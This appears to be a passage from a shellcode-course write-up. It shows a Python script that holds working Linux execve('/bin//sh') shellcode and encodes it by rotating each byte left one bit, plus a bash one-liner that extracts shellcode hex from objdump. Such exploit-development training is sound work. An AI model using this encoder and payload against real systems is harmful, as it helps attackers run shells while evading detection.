To encode the payload I created a python script. This takes all the bytes of the shellcode and rotates them to the left once. 
If there is a most significant byte, it wraps around. In other words if the 128 value bit is set, it is moved to the 1 value bit.
The new encoded shellcode is output in both the '\x' format and the '0x, ' format.
```python
#!/usr/bin/python
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded1 = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
    if x > 127:
        x = x - 128             # Remove the left-most bit
        x = x << 1              # Shift to the left 1
        x += 1                  # Add 1, to complete the rotate
        encoded1 += '\\x'
        encoded1 += '%02x' %x   # Add the rotated left hex to string 
        encoded2 += '0x'
        encoded2 += '%02x,' %x  # Add the rotated left hex to string 
    else:
        encoded1 += '\\x'       # No leftmost bit, just rotate
        encoded1 += '%02x' %(x << 1)
        encoded2 += '0x'        # No leftmost bit, just rotate
        encoded2 += '%02x,' %(x << 1)
    
print encoded1
print encoded2
print 'Len: %d' % len(bytearray(shellcode))
```



To quickly grab the hex from the shellcode I used the method shown in the SLAE course. To make it easier, I added it to a shellscript.
```bash
#!/bin/bash
OBJFILE=$1
objdump -d $(pwd)/${1} | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
```
